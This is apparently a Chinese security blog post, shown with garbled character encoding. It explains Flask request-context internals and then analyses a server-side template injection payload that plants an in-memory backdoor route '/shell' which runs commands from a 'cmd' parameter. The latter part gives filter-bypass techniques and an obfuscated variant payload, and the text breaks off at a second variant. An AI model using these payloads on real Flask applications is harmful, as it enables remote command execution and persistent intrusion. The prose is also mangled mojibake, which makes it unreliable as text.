LocalProxyã€‚å®ƒä»¬ä¸¤ä¸ªçš„ç»“æœå°±æ˜¯æˆ‘ä»¬å¯ä»¥åŠ¨æ€åœ°è·å–ä¸¤ä¸ªä¸Šä¸‹æ–‡çš„å†…å®¹ï¼Œåœ¨å¹¶å‘ç¨‹åºä¸­æ¯ä¸ªè§†å›¾å‡½æ•°éƒ½ä¼šçœ‹åˆ°å±äºè‡ªå·±çš„ä¸Šä¸‹æ–‡ï¼Œè€Œä¸ä¼šå‡ºç°æ··ä¹±ã€‚ _request_ctx_stackä¼šå°†å½“å‰çº¿ç¨‹æˆ–è€…åç¨‹çš„è¯·æ±‚éƒ½ä¿å­˜åœ¨æ ˆé‡Œï¼Œç­‰ä½¿ç”¨çš„æ—¶å€™å†ä»é‡Œé¢è¯»å–ã€‚è‡³äºä¸ºä»€ä¹ˆè¦ç”¨åˆ°æ ˆç»“æ„ï¼Œè€Œä¸æ˜¯ç›´æ¥ä½¿ç”¨ Local å¯¹äºè¿™æ®µä»£ç  _request_ctx_stack = LocalStack() request = LocalProxy(partial(_lookup_req_object, 'request')) session = LocalProxy(partial(_lookup_req_object, 'session')) _request_ctx_stackæ˜¯å¤šçº¿ç¨‹æˆ–è€…åç¨‹éš”ç¦»çš„æ ˆç»“æ„ï¼Œrequest æ¯æ¬¡éƒ½ä¼šè°ƒç”¨ _lookup_req_object æ ˆå¤´éƒ¨çš„æ•°æ®æ¥è·å–ä¿å­˜åœ¨é‡Œé¢çš„ requst context çœ‹ä¸€ä¸‹RequestContextå…·ä½“å†…å®¹ class RequestContext(object): \"\"\"The request context contains all request relevant information. It is created at the beginning of the request and pushed to the `_request_ctx_stack` and removed at the end of it. It will create the URL adapter and request object for the WSGI environment provided. \"\"\" def __init__(self, app, environ, request=None): self.app = app if request is None: request = app.request_class(environ) self.request = request self.url_adapter = app.create_url_adapter(self.request) self.match_request() def match_request(self): \"\"\"Can be overridden by a subclass to hook into the matching of the request. \"\"\" try: url_rule, self.request.view_args = \\ self.url_adapter.match(return_rule=True) self.request.url_rule = url_rule except HTTPException as e: self.request.routing_exception = e def push(self): \"\"\"Binds the request context to the current context.\"\"\" # Before we push the request context we have to ensure that there # is an application context. app_ctx = _app_ctx_stack.top if app_ctx is None or app_ctx.app != self.app: app_ctx = self.app.app_context() app_ctx.push() self._implicit_app_ctx_stack.append(app_ctx) else: self._implicit_app_ctx_stack.append(None) _request_ctx_stack.push(self) self.session = self.app.open_session(self.request) if self.session is None: self.session = self.app.make_null_session() def pop(self, exc=_sentinel): \"\"\"Pops the request context and unbinds it by doing that. This will also trigger the execution of functions registered by the :meth:`~flask.Flask.teardown_request` decorator. \"\"\" app_ctx = self._implicit_app_ctx_stack.pop() try: clear_request = False if not self._implicit_app_ctx_stack: self.app.do_teardown_request(exc) request_close = getattr(self.request, 'close', None) if request_close is not None: request_close() clear_request = True finally: rv = _request_ctx_stack.pop() # get rid of circular dependencies at the end of the request # so that we don't require the GC to be active. if clear_request: rv.request.environ['werkzeug.request'] = None # Get rid of the app as well if necessary. if app_ctx is not None: app_ctx.pop(exc) def auto_pop(self, exc): if self.request.environ.get('flask._preserve_context') or \\ (exc is not None and self.app.preserve_context_on_exception): self.preserved = True self._preserved_exc = exc else: self.pop(exc) def __enter__(self): self.push() return self def __exit__(self, exc_type, exc_value, tb): self.auto_pop(exc_value) æ¯ä¸ª request context éƒ½ä¿å­˜äº†å½“å‰è¯·æ±‚çš„ä¿¡æ¯ï¼Œæ¯”å¦‚ request å¯¹è±¡å’Œ app å¯¹è±¡ã€‚åœ¨åˆå§‹åŒ–çš„æœ€åï¼Œè¿˜è°ƒç”¨äº† match_request å®ç°äº†è·¯ç”±çš„åŒ¹é…é€»è¾‘ã€‚ push æ“ä½œå°±æ˜¯æŠŠè¯¥è¯·æ±‚çš„ ApplicationContextï¼ˆå¦‚æœ _app_ctx_stack æ ˆé¡¶ä¸æ˜¯å½“å‰è¯·æ±‚æ‰€åœ¨ app ï¼Œéœ€è¦åˆ›å»ºæ–°çš„ app contextï¼‰ å’Œ RequestContext æœ‰å…³çš„ä¿¡æ¯ä¿å­˜åˆ°å¯¹åº”çš„æ ˆä¸Šï¼Œå‹æ ˆåè¿˜ä¼šä¿å­˜ session çš„ä¿¡æ¯ï¼› pop åˆ™ç›¸åï¼ŒæŠŠ request context å’Œ application context å‡ºæ ˆï¼Œåšä¸€äº›æ¸…ç†æ€§çš„å·¥ä½œã€‚ åˆ°è¿™é‡Œï¼Œä¸Šä¸‹æ–‡çš„å®ç°å°±æ¯”è¾ƒæ¸…æ™°äº†ï¼šæ¯æ¬¡æœ‰è¯·æ±‚è¿‡æ¥çš„æ—¶å€™ï¼Œflask ä¼šå…ˆåˆ›å»ºå½“å‰çº¿ç¨‹æˆ–è€…è¿›ç¨‹éœ€è¦å¤„ç†çš„ä¸¤ä¸ªé‡è¦ä¸Šä¸‹æ–‡å¯¹è±¡ï¼ŒæŠŠå®ƒä»¬ä¿å­˜åˆ°éš”ç¦»çš„æ ˆé‡Œé¢ï¼Œè¿™æ ·è§†å›¾å‡½æ•°è¿›è¡Œå¤„ç†çš„æ—¶å€™å°±èƒ½ç›´æ¥ä»æ ˆä¸Šè·å–è¿™äº›ä¿¡æ¯ã€‚ add_url_rule äº†è§£åˆ°ï¼Œæ¯æ¬¡æ³¨å†Œè·¯ç”±çš„æ—¶å€™ï¼Œéƒ½ä¼šè°ƒç”¨Routeå‡½æ•°ï¼Œè·Ÿè¿›çœ‹çœ‹ è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªadd_url_ruleå‡½æ•°ï¼Œçœ‹å…¶ä¸­çš„å‚æ•°ï¼Œäº†è§£ä¸€ä¸‹ï¼š ruleï¼šå‡½æ•°å¯¹åº”çš„URLè§„åˆ™, æ»¡è¶³æ¡ä»¶å’Œapp.routeçš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸€æ ·, å¿…é¡»ä»¥/å¼€å¤´ã€‚ endpointï¼šä»£è¡¨è¯¥è·¯ç”±ç»‘å®šçš„å‡½æ•°åï¼šç«¯ç‚¹, å³åœ¨ä½¿ç”¨url_forè¿›è¡Œåè½¬çš„æ—¶å€™, è¿™é‡Œä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯endpointå¯¹åº”çš„å€¼, è¿™ä¸ªå€¼ä¹Ÿå¯ä»¥ä¸æŒ‡å®š, é»˜è®¤å°±ä¼šä½¿ç”¨å‡½æ•°çš„åå­—ä½œä¸ºendpointçš„å€¼. view_funcï¼šå°±æ˜¯å¯¹åº”çš„è¿™ä¸ªè·¯ç”±çš„å‡½æ•°ï¼Œæ¯æ¬¡è¯·æ±‚è¿™ä¸ªè·¯ç”±éƒ½äº¤ç”±è¿™ä¸ªå‡½æ•°å¤„ç†ã€‚URLå¯¹åº”çš„å‡½æ•°, è¿™é‡Œåªéœ€å†™å‡½æ•°åå­—è€Œä¸ç”¨åŠ æ‹¬å·. provideâ€¦ï¼šè¿™é‡Œå°±æ˜¯è¯·æ±‚æ–¹æ³•çš„æ„æ€ï¼Œé»˜è®¤æ˜¯GETï¼Œæ§åˆ¶æ˜¯å¦åº”è‡ªåŠ¨æ·»åŠ é€‰é¡¹æ–¹æ³•. options: è¦è½¬å‘åˆ°åŸºç¡€è§„åˆ™å¯¹è±¡çš„é€‰é¡¹. åŒæ—¶å‡½æ•°è¿™é‡Œå¯ä»¥ç”¨lambdaè¡¨è¾¾å¼å†™ 0x04 POCåˆ†æ è¿™é‡Œç›´æ¥åˆ†æä¸€ä¸ªå¸¸è§çš„payload url_for.__globals__['__builtins__']['eval']( \"app.add_url_rule( '/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read() )\", { '_request_ctx_stack':url_for.__globals__['_request_ctx_stack'], 'app':url_for.__globals__['current_app'] } ) å¯¹äºurl_for.__globals__['__builtins__']['eval']è¿™ä¸€æˆªï¼Œurl_foræ˜¯ä¸€ä¸ªflaskçš„å†…ç½®å‡½æ•°ï¼Œè¿™æ ·å¯ä»¥è°ƒç”¨ä»–çš„__global__å±æ€§ï¼Œè¯¥å±æ€§èƒ½å¤Ÿè¿”å›å‡½æ•°æ‰€åœ¨æ¨¡å—å‘½åç©ºé—´çš„æ‰€æœ‰å˜é‡ï¼Œå…¶ä¸­åŒ…å«äº†å¾ˆå¤šå·²ç»å¼•å…¥çš„modulesï¼Œæˆ‘ä»¬é”®å…¥url_for.__globals__æŸ¥çœ‹å½“å‰æ‰€æœ‰å˜é‡ {'__name__': 'flask.app', '__doc__': None, '__package__': 'flask', '__loader__': &lt;_frozen_importlib_external.SourceFileLoader object at 0x000002AF7EFF1610&gt;, '__spec__': ModuleSpec(name='flask.app', loader=&lt;_frozen_importlib_external.SourceFileLoader object at 0x000002AF7EFF1610&gt;, origin='F:\\\\Develop\\\\Python-3.8.6\\\\lib\\\\site-packages\\\\flask\\\\app.py'), '__file__': 'F:\\\\Develop\\\\Python-3.8.6\\\\lib\\\\site-packages\\\\flask\\\\app.py', '__cached__': 'F:\\\\Develop\\\\Python-3.8.6\\\\lib\\\\site-packages\\\\flask\\\\__pycache__\\\\app.cpython-38.pyc', '__builtins__': {'__name__': 'builtins', '__doc__': \"Built-in functions, exceptions, and other objects. Noteworthy: None is the `nil' object; Ellipsis represents `...' in slices.\", '__package__': '', '__loader__': &lt;class '_frozen_importlib.BuiltinImporter'&gt;, '__spec__': ModuleSpec(name='builtins', loader=&lt;class '_frozen_importlib.BuiltinImporter'&gt;), '__build_class__': &lt;built-in function __build_class__&gt;, '__import__': &lt;built-in function __import__&gt;, 'abs': &lt;built-in function abs&gt;, 'all': &lt;built-in function all&gt;, 'any': &lt;built-in function any&gt;, 'ascii': &lt;built-in function ascii&gt;, 'bin': &lt;built-in function bin&gt;, 'breakpoint': &lt;built-in function breakpoint&gt;, 'callable': &lt;built-in function callable&gt;, 'chr': &lt;built-in function chr&gt;, 'compile': &lt;built-in function compile&gt;, 'delattr': &lt;built-in function delattr&gt;, 'dir': &lt;built-in function dir&gt;, 'divmod': &lt;built-in function divmod&gt;, 'eval': &lt;built-in function eval&gt;, 'exec': &lt;built-in function exec&gt;, 'format': &lt;built-in function format&gt;, 'getattr': &lt;built-in function getattr&gt;, 'globals': &lt;built-in function globals&gt;, 'hasattr': &lt;built-in function hasattr&gt;, 'hash': &lt;built-in function hash&gt;, 'hex': &lt;built-in function hex&gt;, 'id': &lt;built-in function id&gt;, 'input': &lt;built-in function input&gt;, 'isinstance': &lt;built-in function isinstance&gt;, 'issubclass': &lt;built-in function issubclass&gt;, 'iter': &lt;built-in function iter&gt;, 'len': &lt;built-in function len&gt;, 'locals': &lt;built-in function locals&gt;, 'max': &lt;built-in function max&gt;, 'min': &lt;built-in function min&gt;, 'next': &lt;built-in function next&gt;, 'oct': &lt;built-in function oct&gt;, 'ord': &lt;built-in function ord&gt;, 'pow': &lt;built-in function pow&gt;, 'print': &lt;built-in function print&gt;, 'repr': &lt;built-in function repr&gt;, 'round': &lt;built-in function round&gt;, 'setattr': &lt;built-in function setattr&gt;, 'sorted': &lt;built-in function sorted&gt;, 'sum': &lt;built-in function sum&gt;, 'vars': &lt;built-in function vars&gt;, 'None': None, 'Ellipsis': Ellipsis, 'NotImplemented': NotImplemented, 'False': False, 'True': True, 'bool': &lt;class 'bool'&gt;, 'memoryview': &lt;class 'memoryview'&gt;, 'bytearray': &lt;class 'bytearray'&gt;, 'bytes': &lt;class 'bytes'&gt;, 'classmethod': &lt;class 'classmethod'&gt;, 'complex': &lt;class 'complex'&gt;, 'dict': &lt;class 'dict'&gt;, 'enumerate': &lt;class 'enumerate'&gt;, 'filter': &lt;class 'filter'&gt;, 'float': &lt;class 'float'&gt;, 'frozenset': &lt;class 'frozenset'&gt;, 'property': &lt;class 'property'&gt;, 'int': &lt;class 'int'&gt;, 'list': &lt;class 'list'&gt;, 'map': &lt;class 'map'&gt;, 'object': &lt;class 'object'&gt;, 'range': &lt;class 'range'&gt;, 'reversed': &lt;class 'reversed'&gt;, 'set': &lt;class 'set'&gt;, 'slice': &lt;class 'slice'&gt;, 'staticmethod': &lt;class 'staticmethod'&gt;, 'str': &lt;class 'str'&gt;, 'super': &lt;class 'super'&gt;, 'tuple': &lt;class 'tuple'&gt;, 'type': &lt;class 'type'&gt;, 'zip': &lt;class 'zip'&gt;, '__debug__': True, 'BaseException': &lt;class 'BaseException'&gt;, 'Exception': &lt;class 'Exception'&gt;, 'TypeError': &lt;class 'TypeError'&gt;, 'StopAsyncIteration': &lt;class 'StopAsyncIteration'&gt;, 'StopIteration': &lt;class 'StopIteration'&gt;, 'GeneratorExit': &lt;class 'GeneratorExit'&gt;, 'SystemExit': &lt;class 'SystemExit'&gt;, 'KeyboardInterrupt': &lt;class 'KeyboardInterrupt'&gt;, 'ImportError': &lt;class 'ImportError'&gt;, 'ModuleNotFoundError': &lt;class 'ModuleNotFoundError'&gt;, 'OSError': &lt;class 'OSError'&gt;, 'EnvironmentError': &lt;class 'OSError'&gt;, 'IOError': &lt;class 'OSError'&gt;, 'WindowsError': &lt;class 'OSError'&gt;, 'EOFError': &lt;class 'EOFError'&gt;, 'RuntimeError': &lt;class 'RuntimeError'&gt;, 'RecursionError': &lt;class 'RecursionError'&gt;, 'NotImplementedError': &lt;class 'NotImplementedError'&gt;, 'NameError': &lt;class 'NameError'&gt;, 'UnboundLocalError': &lt;class 'UnboundLocalError'&gt;, 'AttributeError': &lt;class 'AttributeError'&gt;, 'SyntaxError': &lt;class 'SyntaxError'&gt;, 'IndentationError': &lt;class 'IndentationError'&gt;, 'TabError': &lt;class 'TabError'&gt;, 'LookupError': &lt;class 'LookupError'&gt;, 'IndexError': &lt;class 'IndexError'&gt;, 'KeyError': &lt;class 'KeyError'&gt;, 'ValueError': &lt;class 'ValueError'&gt;, 'UnicodeError': &lt;class 'UnicodeError'&gt;, 'UnicodeEncodeError': &lt;class 'UnicodeEncodeError'&gt;, 'UnicodeDecodeError': &lt;class 'UnicodeDecodeError'&gt;, 'UnicodeTranslateError': &lt;class 'UnicodeTranslateError'&gt;, 'AssertionError': &lt;class 'AssertionError'&gt;, 'ArithmeticError': &lt;class 'ArithmeticError'&gt;, 'FloatingPointError': &lt;class 'FloatingPointError'&gt;, 'OverflowError': &lt;class 'OverflowError'&gt;, 'ZeroDivisionError': &lt;class 'ZeroDivisionError'&gt;, 'SystemError': &lt;class 'SystemError'&gt;, 'ReferenceError': &lt;class 'ReferenceError'&gt;, 'MemoryError': &lt;class 'MemoryError'&gt;, 'BufferError': &lt;class 'BufferError'&gt;, 'Warning': &lt;class 'Warning'&gt;, 'UserWarning': &lt;class 'UserWarning'&gt;, 'DeprecationWarning': &lt;class 'DeprecationWarning'&gt;, 'PendingDeprecationWarning': &lt;class 'PendingDeprecationWarning'&gt;, 'SyntaxWarning': &lt;class 'SyntaxWarning'&gt;, 'RuntimeWarning': &lt;class 'RuntimeWarning'&gt;, 'FutureWarning': &lt;class 'FutureWarning'&gt;, 'ImportWarning': &lt;class 'ImportWarning'&gt;, 'UnicodeWarning': &lt;class 'UnicodeWarning'&gt;, 'BytesWarning': &lt;class 'BytesWarning'&gt;, 'ResourceWarning': &lt;class 'ResourceWarning'&gt;, 'ConnectionError': &lt;class 'ConnectionError'&gt;, 'BlockingIOError': &lt;class 'BlockingIOError'&gt;, 'BrokenPipeError': &lt;class 'BrokenPipeError'&gt;, 'ChildProcessError': &lt;class 'ChildProcessError'&gt;, 'ConnectionAbortedError': &lt;class 'ConnectionAbortedError'&gt;, 'ConnectionRefusedError': &lt;class 'ConnectionRefusedError'&gt;, 'ConnectionResetError': &lt;class 'ConnectionResetError'&gt;, 'FileExistsError': &lt;class 'FileExistsError'&gt;, 'FileNotFoundError': &lt;class 'FileNotFoundError'&gt;, 'IsADirectoryError': &lt;class 'IsADirectoryError'&gt;, 'NotADirectoryError': &lt;class 'NotADirectoryError'&gt;, 'InterruptedError': &lt;class 'InterruptedError'&gt;, 'PermissionError': &lt;class 'PermissionError'&gt;, 'ProcessLookupError': &lt;class 'ProcessLookupError'&gt;, 'TimeoutError': &lt;class 'TimeoutError'&gt;, 'open': &lt;built-in function open&gt;, 'quit': Use quit() or Ctrl-Z plus Return to exit, 'exit': Use exit() or Ctrl-Z plus Return to exit, 'copyright': Copyright (c) 2001-2020 Python Software Foundation. All Rights Reserved. Copyright (c) 2000 BeOpen.com. All Rights Reserved. Copyright (c) 1995-2001 Corporation for National Research Initiatives. All Rights Reserved. Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam. All Rights Reserved., 'credits': Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands for supporting Python development. See www.python.org for more information., 'license': Type license() to see the full license text, 'help': Type help() for interactive help, or help(object) for help about object.}, 'annotations': _Feature((3, 7, 0, 'beta', 1), (3, 10, 0, 'alpha', 0), 16777216), 'os': &lt;module 'os' from 'F:\\\\Develop\\\\Python-3.8.6\\\\lib\\\\os.py'&gt;, 'sys': &lt;module 'sys' (built-in)&gt;, 't': &lt;module 'typing' from 'F:\\\\Develop\\\\Python-3.8.6\\\\lib\\\\typing.py'&gt;, 'weakref': &lt;module 'weakref' from 'F:\\\\Develop\\\\Python-3.8.6\\\\lib\\\\weakref.py'&gt;, '_abc_Iterator': &lt;class 'collections.abc.Iterator'&gt;, 'timedelta': &lt;class 'datetime.timedelta'&gt;, 'iscoroutinefunction': &lt;function iscoroutinefunction at 0x000002AF6C7E7F70&gt;, 'chain': &lt;class 'itertools.chain'&gt;, 'TracebackType': &lt;class 'traceback'&gt;, '_url_quote': &lt;function quote at 0x000002AF6C8C08B0&gt;, 'click': &lt;module 'click' from 'F:\\\\Develop\\\\Python-3.8.6\\\\lib\\\\site-packages\\\\click\\\\__init__.py'&gt;, 'Headers': &lt;class 'werkzeug.datastructures.headers.Headers'&gt;, 'ImmutableDict': &lt;class 'werkzeug.datastructures.structures.ImmutableDict'&gt;, 'BadRequestKeyError': &lt;class 'werkzeug.exceptions.BadRequestKeyError'&gt;, 'HTTPException': &lt;class 'werkzeug.exceptions.HTTPException'&gt;, 'InternalServerError': &lt;class 'werkzeug.exceptions.InternalServerError'&gt;, 'BuildError': &lt;class 'werkzeug.routing.exceptions.BuildError'&gt;, 'MapAdapter': &lt;class 'werkzeug.routing.map.MapAdapter'&gt;, 'RequestRedirect': &lt;class 'werkzeug.routing.exceptions.RequestRedirect'&gt;, 'RoutingException': &lt;class 'werkzeug.routing.exceptions.RoutingException'&gt;, 'Rule': &lt;class 'werkzeug.routing.rules.Rule'&gt;, 'is_running_from_reloader': &lt;function is_running_from_reloader at 0x000002AF7FA8C430&gt;, 'BaseResponse': &lt;class 'werkzeug.wrappers.response.Response'&gt;, 'cli': &lt;module 'flask.cli' from 'F:\\\\Develop\\\\Python-3.8.6\\\\lib\\\\site-packages\\\\flask\\\\cli.py'&gt;, 'ft': &lt;module 'flask.typing' from 'F:\\\\Develop\\\\Python-3.8.6\\\\lib\\\\site-packages\\\\flask\\\\typing.py'&gt;, 'AppContext': &lt;class 'flask.ctx.AppContext'&gt;, 'RequestContext': &lt;class 'flask.ctx.RequestContext'&gt;, '_cv_app': &lt;ContextVar name='flask.app_ctx' at 0x000002AF7EFAD2C0&gt;, '_cv_request': &lt;ContextVar name='flask.request_ctx' at 0x000002AF7EFAD310&gt;, 'current_app': &lt;Flask 'Flask_debug'&gt;, 'g': &lt;flask.g of 'Flask_debug'&gt;, 'request': &lt;Request 'http://127.0.0.1:5555/test?name={{url_for.__globals__}}' [GET]&gt;, 'request_ctx': &lt;RequestContext 'http://127.0.0.1:5555/test?name={{url_for.__globals__}}' [GET] of Flask_debug&gt;, 'session': &lt;NullSession {}&gt;, 'get_debug_flag': &lt;function get_debug_flag at 0x000002AF7FCD7B80&gt;, 'get_flashed_messages': &lt;function get_flashed_messages at 0x000002AF7FCF2310&gt;, 'get_load_dotenv': &lt;function get_load_dotenv at 0x000002AF7FCD7DC0&gt;, 'send_from_directory': &lt;function send_from_directory at 0x000002AF7FCF24C0&gt;, 'App': &lt;class 'flask.sansio.app.App'&gt;, '_sentinel': &lt;object object at 0x000002AF7FB784D0&gt;, 'SecureCookieSessionInterface': &lt;class 'flask.sessions.SecureCookieSessionInterface'&gt;, 'SessionInterface': &lt;class 'flask.sessions.SessionInterface'&gt;, 'appcontext_tearing_down': &lt;blinker.base.NamedSignal object at 0x000002AF7FCD8A90; 'appcontext-tearing-down'&gt;, 'got_request_exception': &lt;blinker.base.NamedSignal object at 0x000002AF7FCD8A60; 'got-request-exception'&gt;, 'request_finished': &lt;blinker.base.NamedSignal object at 0x000002AF7FCD8820; 'request-finished'&gt;, 'request_started': &lt;blinker.base.NamedSignal object at 0x000002AF7FCD8700; 'request-started'&gt;, 'request_tearing_down': &lt;blinker.base.NamedSignal object at 0x000002AF7FCD87F0; 'request-tearing-down'&gt;, 'Environment': &lt;class 'flask.templating.Environment'&gt;, 'Request': &lt;class 'flask.wrappers.Request'&gt;, 'Response': &lt;class 'flask.wrappers.Response'&gt;, 'T_shell_context_processor': ~T_shell_context_processor, 'T_teardown': ~T_teardown, 'T_template_filter': ~T_template_filter, 'T_template_global': ~T_template_global, 'T_template_test': ~T_template_test, '_make_timedelta': &lt;function _make_timedelta at 0x000002AF7FB51040&gt;, 'Flask': &lt;class 'flask.app.Flask'&gt;}. å¯ä»¥çœ‹åˆ°å­˜åœ¨evalã€execæ¨¡å—ï¼Œæ¥ç€å¯ä»¥çœ‹ä¸€ä¸‹åœ¨__builtins__æ¨¡å—ä¸­, Pythonåœ¨å¯åŠ¨æ—¶å°±ç›´æ¥ä¸ºæˆ‘ä»¬å¯¼å…¥äº†å¾ˆå¤šå†…å»ºå‡½æ•°. å‡†ç¡®çš„è¯´, Pythonåœ¨å¯åŠ¨æ—¶ä¼šé¦–å…ˆåŠ è½½å†…å»ºåç§°ç©ºé—´, å†…å»ºåç§°ç©ºé—´ä¸­æœ‰è®¸å¤šåå­—åˆ°å¯¹è±¡ä¹‹é—´çš„æ˜ å°„, è¿™äº›åå­—å°±æ˜¯å†…å»ºå‡½æ•°çš„åç§°, å¯¹è±¡å°±æ˜¯è¿™äº›å†…å»ºå‡½æ•°å¯¹è±¡. å¯ä»¥çœ‹åˆ°, åœ¨__builtins__æ¨¡å—çš„å†…å»ºå‡½æ•°ä¸­æ˜¯å­˜åœ¨evalã€execç­‰å‘½ä»¤æ‰§è¡Œå‡½æ•°çš„. ['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BlockingIOError', 'BrokenPipeError', 'BufferError', 'BytesWarning', 'ChildProcessError', 'ConnectionAbortedError', 'ConnectionError', 'ConnectionRefusedError', 'ConnectionResetError', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EncodingWarning', 'EnvironmentError', 'Exception', 'False', 'FileExistsError', 'FileNotFoundError', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'InterruptedError', 'IsADirectoryError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'ModuleNotFoundError', 'NameError', 'None', 'NotADirectoryError', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'PermissionError', 'ProcessLookupError', 'RecursionError', 'ReferenceError', 'ResourceWarning', 'RuntimeError', 'RuntimeWarning', 'StopAsyncIteration', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'TimeoutError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'WindowsError', 'ZeroDivisionError', '_', '__build_class__', '__debug__', '__doc__', '__import__', '__loader__', '__name__', '__package__', '__spec__', 'abs', 'aiter', 'all', 'anext', 'any', 'ascii', 'bin', 'bool', 'breakpoint', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'exec', 'exit', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'vars', 'zip'] å› æ­¤æˆ‘ä»¬å°±ç”¨åˆ©ç”¨è¿™ä¸ªå†…å»ºå‡½æ•°æ¥è°ƒç”¨å…¶ä¸­çš„å‘½ä»¤æ‰§è¡Œå‡½æ•° æ¥ç€å†æ¥çœ‹app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read()) è‡³äºè¿™ä¸ªlambdaåŒ¿åå‡½æ•°å¯ä»¥å‚è€ƒèœé¸Ÿæ•™ç¨‹ï¼šhttps://www.runoob.com/python/python-functions.html è¿™æ®µä»£ç å°±æ˜¯å…ˆåŠ¨æ€åˆ›å»ºä¸€æ¡è·¯ç”±ï¼Œè¯¥è·¯ç”±å¤„ç†çš„å‡½æ•°åä¸ºshellï¼Œç„¶åå…·ä½“å‡½æ•°å†…å®¹å°±æ˜¯lambdaè¡¨è¾¾å¼ï¼Œè¡¨è¾¾å¼ä¸­ï¼Œè°ƒç”¨osæ¨¡å—çš„popenå‡½æ•°ï¼Œå…¶ä¸­åˆ©ç”¨_request_ctx_stack.topæ¥è·å–åˆ°è¯·æ±‚çš„ä¸Šä¸‹æ–‡ï¼Œç„¶åè·å–è¯·æ±‚ä¸Šä¸‹æ–‡çš„requestï¼Œç„¶åå†å¾—åˆ°è¯·æ±‚çš„cmdçš„getä¼ å‚ï¼Œç„¶åæ‰§è¡Œã€‚ å†æ¥çœ‹'_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],'app':url_for.__globals__['current_app']} _request_ctx_stackæ˜¯Flaskçš„ä¸€ä¸ªå…¨å±€å˜é‡, æ˜¯ä¸€ä¸ªLocalStackå®ä¾‹, è¿™é‡Œçš„_request_ctx_stackå³ä¸Šæ–‡ä¸­æåˆ°çš„Flask è¯·æ±‚ä¸Šä¸‹æ–‡ç®¡ç†æœºåˆ¶ä¸­çš„_request_ctx_stackã€‚appä¹Ÿæ˜¯Flaskçš„ä¸€ä¸ªå…¨å±€å˜é‡, è¿™é‡Œå³è·å–å½“å‰çš„appã€‚ æ€»çš„æ¥è¯´å°±æ˜¯é€šè¿‡è·å–appå¯¹è±¡ï¼Œä½¿ç”¨appå¯¹è±¡ä¸­çš„add_url_ruleæ–¹æ³•æ·»åŠ èƒ½å¤ŸRCEçš„åé—¨è·¯ç”±è¾¾åˆ°å†…å­˜é©¬çš„æ•ˆæœ 0x05 ByPass å¸¸è§„å­—ç¬¦è¿‡æ»¤çš„ç»•è¿‡ è¿™é‡Œå°±ç›´æ¥æŒ‰å‚è€ƒæ–‡ç« äº† url_forå¯æ›¿æ¢ä¸ºget_flashed_messagesæˆ–è€…request.__init__æˆ–è€…request.application. ä»£ç æ‰§è¡Œå‡½æ•°æ›¿æ¢, å¦‚execç­‰æ›¿æ¢evalã€‚ å­—ç¬¦ä¸²å¯é‡‡ç”¨æ‹¼æ¥æ–¹å¼, å¦‚['__builtins__']['eval']å˜ä¸º['__bui'+'ltins__']['ev'+'al']. __globals__å¯ç”¨__getattribute__('__globa'+'ls__')æ›¿æ¢. []å¯ç”¨.__getitem__()æˆ–.pop()æ›¿æ¢. è¿‡æ»¤{{`æˆ–è€…`}}, å¯ä»¥ä½¿ç”¨{%`æˆ–è€…`%}ç»•è¿‡, {%%}ä¸­é—´å¯ä»¥æ‰§è¡Œifè¯­å¥, åˆ©ç”¨è¿™ä¸€ç‚¹å¯ä»¥è¿›è¡Œç±»ä¼¼ç›²æ³¨çš„æ“ä½œæˆ–è€…å¤–å¸¦ä»£ç æ‰§è¡Œç»“æœ. è¿‡æ»¤_å¯ä»¥ç”¨ç¼–ç ç»•è¿‡, å¦‚__class__æ›¿æ¢æˆ\\x5f\\x5fclass\\x5f\\x5f, è¿˜å¯ä»¥ç”¨dir(0)[0][0]æˆ–è€…request['args']æˆ–è€…request['values']ç»•è¿‡. è¿‡æ»¤äº†.å¯ä»¥é‡‡ç”¨attr()æˆ–[]ç»•è¿‡. å…¶å®ƒçš„æ‰‹æ³•å‚è€ƒSSTIç»•è¿‡è¿‡æ»¤çš„æ–¹æ³•å³å¯â€¦ å˜å½¢payloadï¼š åŸPayload url_for.__globals__['__builtins__']['eval'](\"app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('shell')).read())\",{'_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],'app':url_for.__globals__['current_app']}) å˜å½¢Payload-1 request.application.__self__._get_data_for_json.__getattribute__('__globa'+'ls__').__getitem__('__bui'+'ltins__').__getitem__('ex'+'ec')(\"app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('shell', 'calc')).read())\",{'_request_ct'+'x_stack':get_flashed_messages.__getattribute__('__globa'+'ls__').pop('_request_'+'ctx_stack'),'app':get_flashed_messages.__getattribute__('__globa'+'ls__').pop('curre'+'nt_app')}) å˜å½¢Payload-2 